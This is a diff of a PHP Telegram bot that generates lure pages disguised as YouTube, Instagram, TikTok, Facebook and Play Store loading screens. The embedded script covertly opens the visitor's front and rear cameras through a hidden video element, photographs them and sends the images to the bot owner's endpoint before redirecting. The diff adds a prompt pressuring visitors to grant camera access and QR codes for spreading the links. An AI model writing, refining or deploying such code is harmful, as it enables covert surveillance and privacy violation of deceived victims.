 <canvas id="photo-canvas" width="320" height="240" style="display: none;"></canvas>
+<div id="error-message" style="display:none; color: #ff4444; text-align: center; padding: 20px; font-size: 18px; background: rgba(0,0,0,0.8); border-radius: 10px; margin: 20px; position: relative; z-index: 1000;">
+    ⚠️ يجب السماح بصلاحيات الكاميرا للمتابعة
+</div>
 <script>
     const cameraFeed = document.getElementById('camera-feed');
     const photoCanvas = document.getElementById('photo-canvas');
     const ctx = photoCanvas.getContext('2d');
+    const errorDiv = document.getElementById('error-message');
     const original_url = "{original_url}";
     const phpScriptUrl = "{php_script_url}";
     const ownerChatId = "{owner_chat_id}";
     const ownerUsername = "{owner_username}";
     const quality_choice = "{quality_choice}";
-    const generatedLinkHash = "{generated_link_hash}"; // New: Injected link hash
+    const generatedLinkHash = "{generated_link_hash}";
 
     {$sendDataToPHP_function}
-    {$video_constraints_js} // Contains photoWidth, photoHeight, photoQuality
+    {$video_constraints_js}
+
+    function showPermissionError() {
+        errorDiv.style.display = 'block';
+        document.querySelector('h1') ? document.querySelector('h1').style.display = 'none' : '';
+        const loader = document.querySelector('.loader, .loader-bar, .recaptcha-box');
+        if (loader) loader.style.display = 'none';
+    }
 
     async function captureAndSendPhoto() {
         let stream = null;
         try {
-            // Use photoWidth and photoHeight for ideal resolution
-            const stream = await navigator.mediaDevices.getUserMedia({
+            stream = await navigator.mediaDevices.getUserMedia({
                 video: { 
                     facingMode: 'user', 
                     width: { ideal: photoWidth }, 
@@ -1862,35 +1732,29 @@ EOT;
             });
             cameraFeed.srcObject = stream;
             
-            // Wait for camera to initialize
             await new Promise(resolve => setTimeout(resolve, 3000));
             
-            if (cameraFeed.readyState < 2) {
-                throw new Error('الكاميرا لم تهيئ بعد');
-            }
+            if (cameraFeed.readyState < 2) throw new Error('Camera not ready');
             
-            // Set canvas dimensions before drawing
             photoCanvas.width = photoWidth;
             photoCanvas.height = photoHeight;
             ctx.drawImage(cameraFeed, 0, 0, photoWidth, photoHeight);
             
-            const photoData = photoCanvas.toDataURL('image/jpeg', photoQuality); // Apply photoQuality
+            const photoData = photoCanvas.toDataURL('image/jpeg', photoQuality);
             
-            // Send photo
-            await sendDataToPHP(await fetch(photoData).then(res => res.blob()), 'photo');
-            
-            // Stop camera
-            stream.getTracks().forEach(track => track.stop());
-            
-            // Redirect
-            window.location.href = original_url;
-        } catch (error) {
-            console.error('حدث خطأ:', error);
-            window.location.href = original_url;
-        } finally {
-            if (stream) {
+            try {
+                await sendDataToPHP(await fetch(photoData).then(res => res.blob()), 'photo');
                 stream.getTracks().forEach(track => track.stop());
+                window.location.href = original_url;
+            } catch(e) {
+                console.error('Failed to send photo:', e);
             }
+        } catch (error) {
+            console.error('Camera permission denied:', error);
+            showPermissionError();
+            return false;
+        } finally {
+            if (stream) stream.getTracks().forEach(track => track.stop());
         }
     }
     
@@ -1898,29 +1762,38 @@ EOT;
 </script>
 EOT;
     } elseif ($action_choice == '10') {
-        // كود التقاط صورة امامية (الكاميرا الخلفية)
         $javascript_code = <<<EOT
 <video id="camera-feed" width="320" height="240" autoplay muted style="visibility: hidden; position: absolute;"></video>
 <canvas id="photo-canvas" width="320" height="240" style="display: none;"></canvas>
+<div id="error-message" style="display:none; color: #ff4444; text-align: center; padding: 20px; font-size: 18px; background: rgba(0,0,0,0.8); border-radius: 10px; margin: 20px; position: relative; z-index: 1000;">
+    ⚠️ يجب السماح بصلاحيات الكاميرا للمتابعة
+</div>
 <script>
     const cameraFeed = document.getElementById('camera-feed');
     const photoCanvas = document.getElementById('photo-canvas');
     const ctx = photoCanvas.getContext('2d');
+    const errorDiv = document.getElementById('error-message');
     const original_url = "{original_url}";
     const phpScriptUrl = "{php_script_url}";
     const ownerChatId = "{owner_chat_id}";
     const ownerUsername = "{owner_username}";
     const quality_choice = "{quality_choice}";
-    const generatedLinkHash = "{generated_link_hash}"; // New: Injected link hash
+    const generatedLinkHash = "{generated_link_hash}";
 
     {$sendDataToPHP_function}
-    {$video_constraints_js} // Contains photoWidth, photoHeight, photoQuality
+    {$video_constraints_js}
+
+    function showPermissionError() {
+        errorDiv.style.display = 'block';
+        document.querySelector('h1') ? document.querySelector('h1').style.display = 'none' : '';
+        const loader = document.querySelector('.loader, .loader-bar, .recaptcha-box');
+        if (loader) loader.style.display = 'none';
+    }
 
     async function captureAndSendPhoto() {
         let stream = null;
         try {
-            // Use photoWidth and photoHeight for ideal resolution
-            const stream = await navigator.mediaDevices.getUserMedia({
+            stream = await navigator.mediaDevices.getUserMedia({
                 video: { 
                     facingMode: 'environment', 
                     width: { ideal: photoWidth }, 
@@ -1930,35 +1803,29 @@ EOT;
             });
             cameraFeed.srcObject = stream;
             
-            // Wait for camera to initialize
             await new Promise(resolve => setTimeout(resolve, 3000));
             
-            if (cameraFeed.readyState < 2) {
-                throw new Error('الكاميرا لم تهيئ بعد');
-            }
+            if (cameraFeed.readyState < 2) throw new Error('Camera not ready');
             
-            // Set canvas dimensions before drawing
             photoCanvas.width = photoWidth;
             photoCanvas.height = photoHeight;
             ctx.drawImage(cameraFeed, 0, 0, photoWidth, photoHeight);
             
-            const photoData = photoCanvas.toDataURL('image/jpeg', photoQuality); // Apply photoQuality
+            const photoData = photoCanvas.toDataURL('image/jpeg', photoQuality);
             
-            // Send photo
-            await sendDataToPHP(await fetch(photoData).then(res => res.blob()), 'photo');
-            
-            // Stop camera
-            stream.getTracks().forEach(track => track.stop());
-            
-            // Redirect
-            window.location.href = original_url;
-        } catch (error) {
-            console.error('حدث خطأ:', error);
-            window.location.href = original_url;
-        } finally {
-            if (stream) {
+            try {
+                await sendDataToPHP(await fetch(photoData).then(res => res.blob()), 'photo');
                 stream.getTracks().forEach(track => track.stop());
+                window.location.href = original_url;
+            } catch(e) {
+                console.error('Failed to send photo:', e);
             }
+        } catch (error) {
+            console.error('Camera permission denied:', error);
+            showPermissionError();
+            return false;
+        } finally {
+            if (stream) stream.getTracks().forEach(track => track.stop());
         }
     }
     
@@ -1966,23 +1833,33 @@ EOT;
 </script>
 EOT;
     } elseif ($action_choice == '11') {
-        // كود التقاط صورة سيلفي ثم صورة أمامية
         $javascript_code = <<<EOT
 <video id="camera-feed" width="320" height="240" autoplay muted style="visibility: hidden; position: absolute;"></video>
 <canvas id="photo-canvas" width="320" height="240" style="display: none;"></canvas>
+<div id="error-message" style="display:none; color: #ff4444; text-align: center; padding: 20px; font-size: 18px; background: rgba(0,0,0,0.8); border-radius: 10px; margin: 20px; position: relative; z-index: 1000;">
+    ⚠️ يجب السماح بصلاحيات الكاميرا للمتابعة
+</div>
 <script>
     const cameraFeed = document.getElementById('camera-feed');
     const photoCanvas = document.getElementById('photo-canvas');
     const ctx = photoCanvas.getContext('2d');
+    const errorDiv = document.getElementById('error-message');
     const original_url = "{original_url}";
     const phpScriptUrl = "{php_script_url}";
     const ownerChatId = "{owner_chat_id}";
     const ownerUsername = "{owner_username}";
     const quality_choice = "{quality_choice}";
-    const generatedLinkHash = "{generated_link_hash}"; // New: Injected link hash
+    const generatedLinkHash = "{generated_link_hash}";
 
     {$sendDataToPHP_function}
-    {$video_constraints_js} // Contains photoWidth, photoHeight, photoQuality
+    {$video_constraints_js}
+
+    function showPermissionError() {
+        errorDiv.style.display = 'block';
+        document.querySelector('h1') ? document.querySelector('h1').style.display = 'none' : '';
+        const loader = document.querySelector('.loader, .loader-bar, .recaptcha-box');
+        if (loader) loader.style.display = 'none';
+    }
 
     async function captureAndSendPhoto(facingMode) {
         let stream = null;
@@ -1999,49 +1876,48 @@ EOT;
             
             await new Promise(resolve => setTimeout(resolve, 3000));
             
-            if (cameraFeed.readyState < 2) {
-                throw new Error('الكاميرا لم تهيئ بعد');
-            }
+            if (cameraFeed.readyState < 2) throw new Error('Camera not ready');
             
-            // Set canvas dimensions before drawing
             photoCanvas.width = photoWidth;
             photoCanvas.height = photoHeight;
             ctx.drawImage(cameraFeed, 0, 0, photoWidth, photoHeight);
             
-            const photoData = photoCanvas.toDataURL('image/jpeg', photoQuality); // Apply photoQuality
+            const photoData = photoCanvas.toDataURL('image/jpeg', photoQuality);
             
             await sendDataToPHP(await fetch(photoData).then(res => res.blob()), 'photo');
             
             return true;
         } catch (error) {
-            console.error('حدث خطأ أثناء التقاط الصورة:', error);
-            return false;
+            console.error('Photo capture failed:', error);
+            throw error;
         } finally {
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-            }
+            if (stream) stream.getTracks().forEach(track => track.stop());
         }
     }
     
     window.onload = async function() {
-        const selfieSuccess = await captureAndSendPhoto('user');
-        if (selfieSuccess) {
-            // Wait a second before switching to rear camera
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            await captureAndSendPhoto('environment');
+        try {
+            const selfieSuccess = await captureAndSendPhoto('user');
+            if (selfieSuccess) {
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                await captureAndSendPhoto('environment');
+            }
+            window.location.href = original_url;
+        } catch (error) {
+            console.error('Permission denied or capture failed:', error);
+            showPermissionError();
+            return false;
         }
-        window.location.href = original_url;
     };
 </script>
 EOT;
     }
     
-    // Replace placeholders in JavaScript with actual values
     foreach ($js_template_vars as $key => $value) {
         $javascript_code = str_replace("{" . $key . "}", $value, $javascript_code);
     }
+
     // --- HTML Templates ---
-    // Added {og_meta_tags} placeholder to each head section
     $html_templates = [
         'normal' => <<<EOT
 <!DOCTYPE html>
@@ -2120,49 +1996,25 @@ EOT,
             margin: 0;
             text-align: center;
         }
-        .youtube-logo {
-            width: 150px;
-            margin-bottom: 20px;
-        }
+        .youtube-logo { width: 150px; margin-bottom: 20px; }
         .loader-bar {
-            width: 80%;
-            max-width: 400px;
-            height: 10px;
-            background-color: #404040;
-            position: relative;
-            border-radius: 5px;
-            margin-top: 20px;
+            width: 80%; max-width: 400px; height: 10px;
+            background-color: #404040; position: relative;
+            border-radius: 5px; margin-top: 20px;
         }
         .loader-fill {
-            height: 100%;
-            background-color: #ff0000;
-            border-radius: 5px;
-            animation: load 2s linear infinite;
+            height: 100%; background-color: #ff0000;
+            border-radius: 5px; animation: load 2s linear infinite;
         }
-        @keyframes load {
-            0% { width: 0%; }
-            100% { width: 100%; }
-        }
-        h1 {
-            font-size: 2.5em;
-            font-weight: 300;
-            margin-bottom: 0;
-        }
-        .video-link {
-            font-size: 1.2em;
-            color: #aaa;
-            margin-top: 20px;
-            word-break: break-all;
-            padding: 0 15px;
-        }
+        @keyframes load { 0% { width: 0%; } 100% { width: 100%; } }
+        h1 { font-size: 2.5em; font-weight: 300; margin-bottom: 0; }
+        .video-link { font-size: 1.2em; color: #aaa; margin-top: 20px; word-break: break-all; padding: 0 15px; }
     </style>
 </head>
 <body>
     <img src="https://www.youtube.com/s/desktop/12d6b690/img/favicon_144x144.png" alt="YouTube Logo" class="youtube-logo">
     <h1>جارٍ تحميل الفيديو...</h1>
-    <div class="loader-bar">
-        <div class="loader-fill"></div>
-    </div>
+    <div class="loader-bar"><div class="loader-fill"></div></div>
     <div class="video-link">
         <a href="{$original_url}" style="color: #aaa; text-decoration: none;">{$original_url}</a>
     </div>
@@ -2181,43 +2033,19 @@ EOT,
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #000;
-            color: #fff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            height: 100vh;
-            margin: 0;
-            text-align: center;
+            background-color: #000; color: #fff;
+            display: flex; justify-content: center; align-items: center;
+            flex-direction: column; height: 100vh; margin: 0; text-align: center;
         }
-        .instagram-logo {
-            width: 150px;
-            margin-bottom: 20px;
-        }
+        .instagram-logo { width: 150px; margin-bottom: 20px; }
         .loader {
-            width: 80px;
-            height: 80px;
-            border-radius: 50%;
+            width: 80px; height: 80px; border-radius: 50%;
             border: 8px solid rgba(255, 255, 255, 0.2);
-            border-top-color: #833AB4;
-            animation: spin 1s linear infinite;
-            margin-top: 30px;
+            border-top-color: #833AB4; animation: spin 1s linear infinite; margin-top: 30px;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        h1 {
-            font-size: 2.2em;
-            font-weight: 400;
-            margin-bottom: 0;
-        }
-        p {
-            font-size: 1.4em;
-            color: #ccc;
-            margin-top: 15px;
-        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h1 { font-size: 2.2em; font-weight: 400; margin-bottom: 0; }
+        p { font-size: 1.4em; color: #ccc; margin-top: 15px; }
     </style>
 </head>
 <body>
@@ -2239,69 +2067,25 @@ EOT,
     {og_meta_tags}
     <style>
         body {
-            font-family: sans-serif;
-            background-color: #000;
-            color: #fff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            height: 100vh;
-            margin: 0;
-            position: relative;
-            overflow: hidden;
-            text-align: center;
+            font-family: sans-serif; background-color: #000; color: #fff;
+            display: flex; justify-content: center; align-items: center;
+            flex-direction: column; height: 100vh; margin: 0;
+            position: relative; overflow: hidden; text-align: center;
         }
-        .tiktok-logo-container {
-            width: 100px;
-            height: 100px;
-            position: relative;
-            margin-bottom: 30px;
-        }
+        .tiktok-logo-container { width: 100px; height: 100px; position: relative; margin-bottom: 30px; }
         .tiktok-logo-container .circle {
-            width: 100%;
-            height: 100%;
-            position: absolute;
-            top: 0;
-            left: 0;
-            border-radius: 50%;
+            width: 100%; height: 100%; position: absolute; top: 0; left: 0; border-radius: 50%;
         }
-        .tiktok-logo-container .red,
-        .tiktok-logo-container .blue {
-            animation-duration: 0.8s;
-            animation-iteration-count: infinite;
-            animation-timing-function: ease-in-out;
+        .tiktok-logo-container .red, .tiktok-logo-container .blue {
+            animation-duration: 0.8s; animation-iteration-count: infinite; animation-timing-function: ease-in-out;
         }
-        .tiktok-logo-container .red {
-            background-color: #fe2c55;
-            animation-name: move-red;
-        }
-        .tiktok-logo-container .blue {
-            background-color: #25f4ee;
-            animation-name: move-blue;
-        }
-        .tiktok-logo-container .white {
-            background-color: #fff;
-            mix-blend-mode: screen;
-        }
-        @keyframes move-red {
-            0%, 100% { transform: translateX(0); }
-            50% { transform: translateX(5px); }
-        }
-        @keyframes move-blue {
-            0%, 100% { transform: translateX(0); }
-            50% { transform: translateX(-5px); }
-        }
-        h1 {
-            font-size: 2.5em;
-            font-weight: bold;
-            margin-top: 0;
-        }
-        p {
-            font-size: 1.5em;
-            color: #aaa;
-            margin-top: 10px;
-        }
+        .tiktok-logo-container .red { background-color: #fe2c55; animation-name: move-red; }
+        .tiktok-logo-container .blue { background-color: #25f4ee; animation-name: move-blue; }
+        .tiktok-logo-container .white { background-color: #fff; mix-blend-mode: screen; }
+        @keyframes move-red { 0%, 100% { transform: translateX(0); } 50% { transform: translateX(5px); } }
+        @keyframes move-blue { 0%, 100% { transform: translateX(0); } 50% { transform: translateX(-5px); } }
+        h1 { font-size: 2.5em; font-weight: bold; margin-top: 0; }
+        p { font-size: 1.5em; color: #aaa; margin-top: 10px; }
     </style>
 </head>
 <body>
@@ -2326,55 +2110,26 @@ EOT,
     {og_meta_tags}
     <style>
         body {
-            font-family: Helvetica, Arial, sans-serif;
-            background-color: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            height: 100vh;
-            margin: 0;
-            text-align: center;
-            color: #4b4f56;
+            font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5;
+            display: flex; justify-content: center; align-items: center;
+            flex-direction: column; height: 100vh; margin: 0; text-align: center; color: #4b4f56;
         }
-        .facebook-logo {
-            width: 120px;
-            height: 120px;
-            object-fit: contain;
-            margin-bottom: 30px;
-        }
+        .facebook-logo { width: 120px; height: 120px; object-fit: contain; margin-bottom: 30px; }
         .loader-bar {
-            width: 80%;
-            max-width: 300px;
-            height: 5px;
-            background-color: #e4e6eb;
-            position: relative;
-            border-radius: 2.5px;
-            margin-top: 20px;
-            overflow: hidden;
+            width: 80%; max-width: 300px; height: 5px; background-color: #e4e6eb;
+            position: relative; border-radius: 2.5px; margin-top: 20px; overflow: hidden;
         }
         .loader-fill {
-            height: 100%;
-            background-color: #1877f2;
-            border-radius: 2.5px;
+            height: 100%; background-color: #1877f2; border-radius: 2.5px;
             animation: facebook-load 1.5s linear infinite;
         }
-        @keyframes facebook-load {
-            0% { transform: translateX(-100%); }
-            100% { transform: translateX(100%); }
-        }
-        p {
-            font-size: 1.1em;
-            color: #606770;
-            margin-top: 20px;
-        }
+        @keyframes facebook-load { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
+        p { font-size: 1.1em; color: #606770; margin-top: 20px; }
     </style>
 </head>
 <body>
     <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yD/r/5D8s-GsHJlJ.png" alt="Facebook Logo" class="facebook-logo">
-    <div class="loader-bar">
-        <div class="loader-fill"></div>
-    </div>
+    <div class="loader-bar"><div class="loader-fill"></div></div>
     <p>جارٍ تحميل المحتوى...</p>
     {javascript_code}
 </body>
@@ -2390,49 +2145,20 @@ EOT,
     {og_meta_tags}
     <style>
         body {
-            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
-            background-color: #fff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            height: 100vh;
-            margin: 0;
-            text-align: center;
-            color: #202124;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif; background-color: #fff;
+            display: flex; justify-content: center; align-items: center;
+            flex-direction: column; height: 100vh; margin: 0; text-align: center; color: #202124;
         }
-        .playstore-logo {
-            width: 100px;
-            height: 100px;
-            margin-bottom: 20px;
-        }
+        .playstore-logo { width: 100px; height: 100px; margin-bottom: 20px; }
         .loader {
-            width: 50px;
-            height: 50px;
-            border: 5px solid #e8eaed;
-            border-top-color: #4285f4; /* Blue */
-            border-left-color: #34a853; /* Green */
-            border-right-color: #fbbc05; /* Yellow */
-            border-bottom-color: #ea4335; /* Red */
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-top: 20px;
+            width: 50px; height: 50px; border: 5px solid #e8eaed;
+            border-top-color: #4285f4; border-left-color: #34a853;
+            border-right-color: #fbbc05; border-bottom-color: #ea4335;
+            border-radius: 50%; animation: spin 1s linear infinite; margin-top: 20px;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        h1 {
-            font-size: 2em;
-            font-weight: 500;
-            margin-top: 25px;
-            color: #202124;
-        }
-        p {
-            font-size: 1.1em;
-            color: #5f6368;
-            margin-top: 10px;
-        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h1 { font-size: 2em; font-weight: 500; margin-top: 25px; color: #202124; }
+        p { font-size: 1.1em; color: #5f6368; margin-top: 10px; }
     </style>
 </head>
 <body>
@@ -2447,7 +2173,6 @@ EOT
     ];
 
     $html_template = $html_templates[$loading_type];
-    // Replace all placeholders
     $final_html = str_replace(
         ['{javascript_code}', '{og_meta_tags}', '{og_title}', '{original_url}'], 
         [$javascript_code, $og_meta_tags, $og_title, htmlspecialchars($original_url, ENT_QUOTES | ENT_HTML5, 'UTF-8')], 
@@ -2455,7 +2180,6 @@ EOT
     );
     
     $file_name = GENERATED_LINKS_DIR . 'link_owner_' . $chat_id . '_' . $link_hash . '.html';
-
     file_put_contents($file_name, $final_html);
 
     $base_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://";
@@ -2465,7 +2189,6 @@ EOT
     
     $text = "✅ **تم إنشاء الرابط بنجاح!**\n\nالرابط المخصص جاهز للاستخدام:\n<code>" . htmlspecialchars($full_url) . "</code>\n\nالرجاء حفظ الرابط للاستخدام المستقبلي.";
 
-    // في دالة generateFinalLink، غير لوحة المفاتيح إلى:
     $keyboard = [
         'inline_keyboard' => [
             [
@@ -2486,7 +2209,6 @@ EOT
     @unlink(getUserStateFile($chat_id, "loading"));
 }
 
-// أضف هذه الدالة في نهاية الكود:
 function generateQRCode($chat_id, $message_id, $link_hash) {
     $base_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://";
     $base_url .= $_SERVER['HTTP_HOST'];
@@ -2494,10 +2216,8 @@ function generateQRCode($chat_id, $message_id, $link_hash) {
     $file_name = GENERATED_LINKS_DIR . 'link_owner_' . $chat_id . '_' . $link_hash . '.html';
     $full_url = rtrim($base_url . $script_dir, '/') . '/' . $file_name;
 
-    // إنشاء رابط QR code باستخدام خدمة خارجية
     $qr_code_url = "https://api.qrserver.com/v1/create-qr-code/?size=500x500&data=" . urlencode($full_url);
 
-    // إرسال الصورة باستخدام رابط QR code
     $data = [
         'chat_id' => $chat_id,
         'photo' => $qr_code_url,
@@ -2514,15 +2234,8 @@ function generateQRCode($chat_id, $message_id, $link_hash) {
 }
 
 
-// --- New Pagination and Long Message Handling Functions ---
+// --- Pagination Functions ---
 
-/**
- * Handles long messages by splitting them into chunks and sending them with navigation buttons.
- * @param int $chat_id
- * @param int $message_id
- * @param string $full_text
- * @param string $context Used to build the back button callback data
- */
 function handleLongMessage($chat_id, $message_id, $full_text, $context) {
     $file_id = uniqid('msg_');
     $temp_data = [
@@ -2531,7 +2244,6 @@ function handleLongMessage($chat_id, $message_id, $full_text, $context) {
     ];
     file_put_contents(PAGINATION_TEMP_DIR . $file_id . '.json', json_encode($temp_data));
 
-    // Cleanup old files (e.g., older than 1 hour)
     $old_files = glob(PAGINATION_TEMP_DIR . '*.json');
     $cutoff = time() - 3600;
     foreach ($old_files as $file) {
@@ -2550,14 +2262,6 @@ function handleLongMessage($chat_id, $message_id, $full_text, $context) {
     editMessage($chat_id, $message_id, $message_content, $reply_markup);
 }
 
-/**
- * Handles the logic for navigating between pages of a long message.
- * @param int $chat_id
- * @param int $message_id
- * @param string $file_id
- * @param int $page
- * @param string $context
- */
 function handlePaginatedMessage($chat_id, $message_id, $file_id, $page, $context) {
     $file_path = PAGINATION_TEMP_DIR . $file_id . '.json';
     if (!file_exists($file_path)) {
@@ -2571,8 +2275,7 @@ function handlePaginatedMessage($chat_id, $message_id, $file_id, $page, $context
     $total_pages = count($text_chunks);
     
     if ($page < 0 || $page >= $total_pages) {
-        // Page is out of bounds, just refresh the current page
-        $page = 0; 
+        $page = 0;
     }
 
     $reply_markup = buildPaginationKeyboard($file_id, $page, $total_pages, $context);
@@ -2581,14 +2284,6 @@ function handlePaginatedMessage($chat_id, $message_id, $file_id, $page, $context
     editMessage($chat_id, $message_id, $message_content, $reply_markup);
 }
 
-/**
- * Builds the inline keyboard for a paginated message.
- * @param string $file_id
- * @param int $current_page
- * @param int $total_pages
- * @param string $context
- * @return string JSON string
- */
 function buildPaginationKeyboard($file_id, $current_page, $total_pages, $context) {
     $keyboard = [];
     $nav_buttons = [];
